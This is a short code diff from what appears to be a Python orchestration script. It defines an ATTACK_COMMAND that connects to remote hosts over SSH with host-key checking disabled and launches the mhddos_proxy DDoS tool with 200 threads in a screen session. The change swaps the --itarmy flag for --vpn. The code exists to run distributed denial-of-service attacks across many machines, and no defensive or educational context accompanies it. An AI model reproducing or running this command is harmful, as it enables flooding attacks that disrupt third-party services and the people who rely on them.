@@ -30,7 +30,7 @@ INSTALL_COMMAND = (
 )
 ATTACK_COMMAND = (
     'ssh -o StrictHostKeyChecking=no -i {caw_keys_dir}{email}__{host}__{port} cabox@{host} -p {port} '
-    '-t "screen -S "mhddos_proxy" ./mhddos_proxy_linux --lang en --copies auto --itarmy --threads 200"'
+    '-t "screen -S "mhddos_proxy" ./mhddos_proxy_linux --vpn --lang en --copies auto --threads 200"'
 )
 
 
